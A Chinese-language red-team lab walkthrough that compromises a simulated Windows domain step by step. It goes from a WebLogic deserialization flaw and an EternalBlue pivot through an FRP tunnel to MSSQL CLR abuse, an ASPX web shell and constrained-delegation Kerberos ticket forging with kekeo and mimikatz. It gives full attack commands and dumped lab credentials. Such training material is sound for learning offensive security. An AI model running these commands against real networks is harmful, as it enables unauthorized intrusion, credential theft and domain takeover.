## 前言

![](https://image.3001.net/images/20211112/1636704314_618e203aed9c3a0ec73e7.png!small)

域控桌面下有一个 Flag 文件，需要拿到即可通关。

## 外网打点之 Weblogic-CVE-2017-10271

首先拿到了目标的 IP：192.168.0.154，对该 IP 使用 Nmap 进行常规 TCP 端口扫描：

    
    
    nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88 192.168.0.154
    

在一般实战中建议制定端口扫描，因为速度快且扫描精度高：

![](https://image.3001.net/images/20211112/1636704318_618e203e5247f14aa42eb.png!small)

发现开放了两个端口，其中有一个是 Weblogic
12：http://192.168.0.154:7001/console/login/LoginForm.jsp

![](https://image.3001.net/images/20211112/1636704322_618e20429981fa77f0175.png!small)

通过信息搜集发现目标存在 CVE-2017-10271反序列化漏洞：

![](https://image.3001.net/images/20211112/1636704324_618e2044c53593673b3c0.png!small)

且当前权限是一个 administrator 权限，而且出网：

![](https://image.3001.net/images/20211112/1636704326_618e2046a5b89ef70d87f.png!small)

![](https://image.3001.net/images/20211112/1636704327_618e2047c9407bc4e050c.png!small)

由于当前机器无 AV 直接上 Powershell 上线到 CobaltStrike：

![](https://image.3001.net/images/20211112/1636704328_618e2048ea0a01f90b1bb.png!small)

## 工作组下的内网渗透

通过发现当前机器是有两个网卡，其中 10 是内网网卡，随后对当前机器进行抓密码：

    
    
    WEBLOGIC\Administrator ccef208c6485269c20db2cad21734fe7
    

![](https://image.3001.net/images/20211112/1636704330_618e204ab23974b2b69f1.png!small)

由于当前是 Windows 2012 所以无法抓到明文，先留着，由于是工作组环境，先对其 C 段进行信息搜集看看存活：

![](https://image.3001.net/images/20211112/1636704331_618e204bcf2f516a10943.png!small)

发现内网有一台 Windows 7（10.10.20.7）应该是域机器。

通过 fscan 也扫描出来存在永恒之蓝：

![](https://image.3001.net/images/20211112/1636704333_618e204d0e53f6613b4a6.png!small)

随后通过 Frp 建立一个 socks5 隧道，红队人员服务器配置文件 frps.ini，然后运行：

    
    
    [common]
    bind_addr =0.0.0.0
    bind_port = 7000
    

![](https://image.3001.net/images/20211112/1636704334_618e204ecc53dae671452.png!small)

之后来到目标跳板机器运行 frpc：

    
    
    [common]
    server_addr = 192.168.0.175
    server_port = 7000
    
    [plugin_socks]
    type = tcp
    remote_port = 7777
    plugin = socks5
    

![](https://image.3001.net/images/20211112/1636704336_618e20502762aa368487f.png!small)

建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话：

    
    
    msf6 > setg Proxies socks5:192.168.0.175:7777
    msf6 > setg ReverseAllowProxy true
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    msf6 > set payload windows/x64/meterpreter/bind_tcp
    msf6 > set rhost 10.10.20.7
    msf6 > run
    

![](https://image.3001.net/images/20211112/1636704337_618e2051b2b8e0893d1d8.png!small)

通过调用 mimikatz 成功抓到其域用户的密码：

    
    
    Username  Domain   Password
    --------  ------   --------    saul      REDTEAM  admin!@#45
    

![](https://image.3001.net/images/20211112/1636704340_618e2054c45fd5b573546.png!small)

## 中转上线到 CobaltStrike 进行第二层内网域渗透

因为此 Win7 不出网，随后只能通过 CobaltStrike 设置中转：

![](https://image.3001.net/images/20211112/1636704342_618e2056644f6ccc9a3c3.png!small)

然后成功上线到 CobaltStrike：

![](https://image.3001.net/images/20211112/1636704343_618e205798d725e6e6cd6.png!small)

通过信息搜集发现当前机器的确是在域环境：

![](https://image.3001.net/images/20211112/1636704346_618e205a0d04d5d43e0a4.png!small)

随后定位到域控 DC IP 为：`10.10.10.8`

![](https://image.3001.net/images/20211112/1636704347_618e205b383ef8f86b64d.png!small)

想个办法拿到 DC，首先当前进程是没有域管的，所以暂且放弃令牌窃取：

![](https://image.3001.net/images/20211112/1636704348_618e205c9b07a9951e65e.png!small)

由于我们已经拿到了一个域用户的账户密码，尝试查找约束委派的用户：

    
    
    AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
    

![](https://image.3001.net/images/20211112/1636704351_618e205f15269ec155ad0.png!small)

找到了一个 sqlserver 的用户是被设置了约束委派，得想办法搞到这个用户的账密。

通过信息搜集发现 sqlserver 这台机器开放了 80、1433（mssql）：

![](https://image.3001.net/images/20211112/1636704352_618e20604c8c041ab24da.png!small)

通过一顿信息搜集没发现 80 有什么可利用的东西：

![](https://image.3001.net/images/20211112/1636704353_618e2061b26c294887147.png!small)

但是通过一波密码喷洒发现 mssql 数据库的密码是弱口令：

![](https://image.3001.net/images/20211112/1636704357_618e20655734c34281b43.png!small)

随后对其进行 xp_cmdshell 调用系统命令：

![](https://image.3001.net/images/20211112/1636704361_618e20699477514cc6497.png!small)

发现权限很小只是一个普通服务权限，由于目标机器不出网不存在让他下载我们的 exe，随后使用 MSF + Proxychains 调用 xpcmdshell
模块上线到 MSF，但是失败了：

![](https://image.3001.net/images/20211112/1636704366_618e206eb7189dd24b419.png!small)

既然上线失败且目标是 iis，那么想办法找到 iis 到目录写个一句话吧。

一般 iis 的目录是：`C:\inetpub\wwwroot`，那么查看下是否存在：

![](https://image.3001.net/images/20211112/1636704369_618e2071e90058d933446.png!small)

果然还是默认目录，接下来写个 txt 试试：

![](https://image.3001.net/images/20211112/1636704373_618e2075740f852d1d9c0.png!small)

不行权限太小了，这条路走不通。

使用 SharpSQLTools 开启目标 clr：

    
    
    SharpSQLTools.exe 10.10.10.18 sa sa master install_clr whoami
    

![](https://image.3001.net/images/20211112/1636704374_618e20767a868aa85fc2c.png!small)

然后启用并调用命令：

    
    
    SharpSQLTools.exe 10.10.10.18 sa sa master enable_clrSharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami
    

![](https://image.3001.net/images/20211112/1636704375_618e207784abd78e7a954.png!small)

这下子就是一个系统权限了！

随后添加了一个管理员：

    
    
    asp.netqwe123..
    

![](https://image.3001.net/images/20211112/1636704377_618e207943eb31361fc9f.png!small)

然后写文件也能写进去：

![](https://image.3001.net/images/20211112/1636704381_618e207da567a2c8cc3dc.png!small)

然后写了一个一句话进去：

    
    
    echo ^<^%^@Page Language=^"^Jscript^"^%^>^<^%^eval(Request.Item^[^"saul^"^]^,^"unsafe^")^;^%^>>c:\inetpub\wwwroot\1.aspx
    

发现都不行，还是用 MSF 把：

    
    
    exploit/windows/mssql/mssql_clr_payload
    

![](https://image.3001.net/images/20211112/1636704385_618e20812d8dbe1467587.png!small)

然后找到了一个可读可写目录上传 exe 成功，然后中转再上线到 CobaltStrike：

![](https://image.3001.net/images/20211112/1636704387_618e2083113205525781f.png!small)

![](https://image.3001.net/images/20211112/1636704388_618e208492a8a48241dc6.png!small)

权限太小了，用这个执行下：

![](https://image.3001.net/images/20211112/1636704390_618e2086957fd3096cb9b.png!small)

![](https://image.3001.net/images/20211112/1636704393_618e2089d0657afe36e8b.png!small)

这个时候提权成功，然后抓到 sqlserver 的密码：

    
    
    user : redteam\sqlserverpass : Server12345
    

![](https://image.3001.net/images/20211112/1636704395_618e208b7cd3411dcc4dc.png!small)

之前信息搜集的时候我们知道`sqlserver`是一个约束委派的用户，我们可以通过约束委派攻击来接管域控。

## 约束委派攻击接管域控

利用 kekeo 请求该用户的
TGT：`TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi`

    
    
    kekeo.exe "tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi" 
    

![](https://image.3001.net/images/20211112/1636704397_618e208d81cf0b7d01536.png!small)

然后使用这张 TGT (`TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi`)
获取域机器的
ST：`TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi`

    
    
    kekeo.exe "tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red"
    

![](https://image.3001.net/images/20211112/1636704399_618e208fd6c2ca7b45689.png!small)

![](https://image.3001.net/images/20211112/1636704402_618e2092516c62db68ea5.png!small)

使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt：

    
    
    mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi
    

![](https://image.3001.net/images/20211112/1636704403_618e2093e9faede524e10.png!small)

成功拿到域控权限：

![](https://image.3001.net/images/20211112/1636704405_618e20951a0e2b187f6ca.png!small)

最后也是成功拿到 Flag：

![](https://image.3001.net/images/20211112/1636704406_618e2096d51e72f8b3bd7.png!small)

## 结尾

本靶场还有很多种方式能够拿到域控，大家有兴趣可以多试试几种漏洞 :)

这里是 **渗透攻击红队** ，我是 **saulGoodman** ，有问题可以随时私信我与我联系。

